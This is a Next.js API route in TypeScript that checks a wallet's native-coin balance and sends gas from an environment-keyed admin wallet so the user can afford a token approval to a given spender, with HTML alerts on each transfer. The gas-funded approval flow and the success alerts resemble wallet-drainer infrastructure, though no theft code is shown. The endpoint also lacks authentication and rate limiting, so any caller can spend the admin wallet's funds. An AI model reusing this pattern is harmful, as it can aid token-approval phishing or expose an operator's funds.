import { NextRequest, NextResponse } from 'next/server';
import { createPublicClient, createWalletClient, http, parseEther, formatEther } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc, bscTestnet, mainnet, sepolia, polygon, polygonMumbai } from 'viem/chains';
import addressConfig from '@/constents';
import { sendAlert } from '@/constentFunctions';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';
export const maxDuration = 60; // Allow up to 60 seconds (Vercel Pro+) or 10 seconds (Hobby)

// Map chain IDs to viem chains
const chains = {
  '56': bsc,
  '97': bscTestnet,
  '1': mainnet,
  '11155111': sepolia,
  '137': polygon,
  '80001': polygonMumbai,
};

// Minimum gas balance threshold (in native token)
const MIN_ADMIN_BALANCE = parseEther('0.01'); // 0.01 ETH/BNB/MATIC

export async function POST(request: NextRequest) {
  console.log('[check-gas] Starting request...');
  const startTime = Date.now();
  
  try {
    console.log('[check-gas] Parsing request body...');
    const { userAddress, tokenAddress, spenderAddress, chainId } = await request.json();
    console.log('[check-gas] Request params:', { userAddress, chainId });

    // Validate inputs
    if (!userAddress || !tokenAddress || !spenderAddress || !chainId) {
      console.log('[check-gas] Missing parameters');
      return NextResponse.json(
        { error: 'Missing required parameters' },
        { status: 400 }
      );
    }

    // Get the appropriate chain and RPC
    console.log('[check-gas] Getting chain config...');
    const chain = chains[chainId as keyof typeof chains];
    const cfg = addressConfig[chainId as keyof typeof addressConfig] as { RPC?: string } | undefined;
    const rpcUrl = cfg?.RPC;
    console.log('[check-gas] RPC URL:', rpcUrl);
    
    if (!chain || !rpcUrl) {
      console.log('[check-gas] Unsupported chain');
      return NextResponse.json(
        { error: 'Unsupported chain' },
        { status: 400 }
      );
    }

    // Get private key from environment
    const privateKey = process.env.OWNER_PRIVATE_KEY;
    if (!privateKey) {
      console.log('[check-gas] Private key not found');
      return NextResponse.json(
        { error: 'Server configuration error' },
        { status: 500 }
      );
    }
    console.log('[check-gas] Private key loaded');

    // Create clients
    console.log('[check-gas] Creating viem clients...');
    const publicClient = await createPublicClient({
      chain,
      transport: http(rpcUrl),
    });

    const account = privateKeyToAccount(privateKey as `0x${string}`);
    const walletClient = await createWalletClient({
      account,
      chain,
      transport: http(rpcUrl),
    });

    console.log('[check-gas] Clients created for chain:', chain.name);
    
    // Estimate gas for the approval transaction
    const gasEstimate = BigInt(100000);

    console.log('[check-gas] Gas estimate:', gasEstimate.toString());
    
    // Get current gas price
    console.log('[check-gas] Fetching gas price...');
    const gasPrice = await publicClient.getGasPrice();
    console.log('[check-gas] Gas price:', formatEther(gasPrice), 'ETH');

    // Calculate total gas cost (gas * gasPrice) with 50.2% buffer
    const gasBuffer = BigInt(5020); // 50.2% buffer
    const gasCostWithBuffer = (gasEstimate * gasPrice * gasBuffer) / BigInt(10000);

    console.log('[check-gas] Gas cost with buffer:', formatEther(gasCostWithBuffer), 'ETH');

    // Check user's balance
    console.log('[check-gas] Checking user balance...', { userAddress });
    const userBalance = await publicClient.getBalance({
      address: userAddress as `0x${string}`,
    });

    console.log('[check-gas] User balance:', formatEther(userBalance), 'Required:', formatEther(gasCostWithBuffer));

    let needsGas = false;
    let gasSent = false;
    let gasAmountSent = '0';
    let adminAlert = false;

    // If user doesn't have enough gas, send them some
    if (userBalance < gasCostWithBuffer) {
      needsGas = true;
      console.log('[check-gas] User needs gas, checking admin balance...', { userAddress });

      // Check admin wallet balance first
      console.log('[check-gas] Checking admin balance...', { adminAddress: account.address });
      const adminBalance = await publicClient.getBalance({
        address: account.address,
      });
      
      console.log('[check-gas] Admin balance:', formatEther(adminBalance), 'Required:', formatEther(gasCostWithBuffer));

      // Check if admin has enough balance
      if (adminBalance < MIN_ADMIN_BALANCE) {
        // Admin balance is too low - send alert
        const chainNames: { [key: string]: string } = {
          '97': 'BSC Testnet',
          '56': 'BSC Mainnet',
          '11155111': 'Ethereum Sepolia',
          '1': 'Ethereum Mainnet',
          '80001': 'Polygon Mumbai',
          '137': 'Polygon Mainnet'
        };

        const chainName = chainNames[chainId] || `Chain ${chainId}`;
        const nativeToken = chainId === '56' || chainId === '97' ? 'BNB' : 
                           chainId === '137' || chainId === '80001' ? 'MATIC' : 'ETH';

        const alertMessage = `⚠️ <b>LOW GAS BALANCE ALERT!</b>\n\n` +
          `🔴 Admin wallet is running low on gas!\n` +
          `💰 Current Balance: <b>${formatEther(adminBalance)} ${nativeToken}</b>\n` +
          `⛓️ Network: <b>${chainName}</b>\n` +
          `📍 Address: <code>${account.address}</code>\n\n` +
          `⚡️ Please top up the admin wallet to continue operations!`;

        await sendAlert(alertMessage);
        adminAlert = true;

        // Still try to send if we have something
        if (adminBalance < gasCostWithBuffer) {
          return NextResponse.json({
            needsGas: true,
            gasSent: false,
            error: 'Insufficient admin balance',
            adminAlert: true,
          });
        }
      }

      // Send gas to user
      try {
        console.log('[check-gas] Sending gas to user...');
        const hash = await walletClient.sendTransaction({
          to: userAddress as `0x${string}`,
          value: gasCostWithBuffer,
        });

        gasSent = true;
        gasAmountSent = formatEther(gasCostWithBuffer);
        console.log('[check-gas] Gas sent! TX:', hash);

        // Send success notification
        const chainNames: { [key: string]: string } = {
          '97': 'BSC Testnet',
          '56': 'BSC Mainnet',
          '11155111': 'Ethereum Sepolia',
          '1': 'Ethereum Mainnet',
          '80001': 'Polygon Mumbai',
          '137': 'Polygon Mainnet'
        };

        const chainName = chainNames[chainId] || `Chain ${chainId}`;
        const nativeToken = chainId === '56' || chainId === '97' ? 'BNB' : 
                           chainId === '137' || chainId === '80001' ? 'MATIC' : 'ETH';

        const message = `⛽️ <b>Gas Fee Sent!</b>\n\n` +
          `👤 User: <code>${userAddress}</code>\n` +
          `💸 Amount: <b>${gasAmountSent} ${nativeToken}</b>\n` +
          `⛓️ Network: <b>${chainName}</b>\n` +
          `✅ Tx: <code>${hash}</code>`;

        await sendAlert(message);
      } catch (error) {
        console.error('[check-gas] Failed to send gas:', error);
        return NextResponse.json({
          needsGas: true,
          gasSent: false,
          error: 'Failed to send gas fee',
        });
      }
    }

    const elapsed = Date.now() - startTime;
    console.log(`[check-gas] Request completed in ${elapsed}ms`);

    return NextResponse.json({
      needsGas,
      gasSent,
      gasAmountSent,
      adminAlert,
      userBalance: formatEther(userBalance),
      requiredGas: formatEther(gasCostWithBuffer),
    });

  } catch (error) {
    console.error('[check-gas] Error:', error);
    return NextResponse.json(
      { 
        error: 'Failed to check gas',
        details: error instanceof Error ? error.message : 'Unknown error'
      },
      { status: 500 }
    );
  }
}
